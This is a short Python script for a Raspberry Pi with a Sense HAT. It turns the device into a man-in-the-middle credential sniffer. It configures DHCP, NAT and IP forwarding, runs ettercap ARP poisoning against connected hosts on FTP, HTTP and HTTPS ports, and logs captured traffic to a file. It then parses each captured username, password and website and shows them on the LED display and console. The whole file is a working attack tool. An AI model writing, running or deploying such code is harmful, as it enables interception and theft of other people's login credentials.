#!/usr/bin/python

#############################################
# Traffic Python Script
# Designed and Written by Salvador Melendez
#############################################

import os
import sys
import time
sys.path.insert(0, '/home/pi')
import netscanner as ns
from sense_hat import SenseHat
sense = SenseHat()
sense.set_rotation(180)
sense.clear()

os.system("ifconfig eth0 192.168.11.1/29")
os.system("service isc-dhcp-server start")
ns.init()
os.system("iptables -F")
os.system("iptables -A FORWARD --in-interface eth0 -j ACCEPT")
os.system("iptables --table nat -A POSTROUTING --out-interface wlan0 -j MASQUERADE")

raw_input('\n\nConnect the Ethernet cable and press ENTER...')
ns.please_wait()
os.system("ettercap -TqM arp:remote /192.168.11.1// /192.168.11.2-6//20,21,80,443 > credentials.txt &")
time.sleep(5)
os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
fname = "credentials.txt"
start = "USER: "
line_counter = -1
loop_counter = 0
user = ""
password = ""

ns.loading_sniff()
print '\n\nWaiting for credentials...\n'

while True:
    if os.path.isfile(fname):
        with open(fname) as ettercap_file:
            for i, line in enumerate(ettercap_file):
                if i > line_counter:
                    line_counter += 1
                    if "PASS:" in line:
                        os.system('omxplayer -o both /home/pi/sounds/1_up.mp3 > /home/pi/log &')
                        cred = line[line.find(start)+len(start):]
                        data = cred.split("PASS: ")
                        user = data[0].replace(' ','')
                        temp = data[1].split("INFO: ")
                        password = temp[0].replace(' ','')
                        website = temp[1].replace(' ','')
                        loop_counter += 1
                        sense.show_message('User: ', text_colour=(255,255,255))
                        sense.show_message(user, text_colour=(0,0,255))
                        sense.show_message('Pass: ', text_colour=(255,255,255))
                        sense.show_message(password, text_colour=(255,0,0))
                        print str(loop_counter) + " --> \tUser: " + user + "\n\tPass: " + password + "\n\tWebsite: " + website
        ettercap_file.close()
        time.sleep(5)
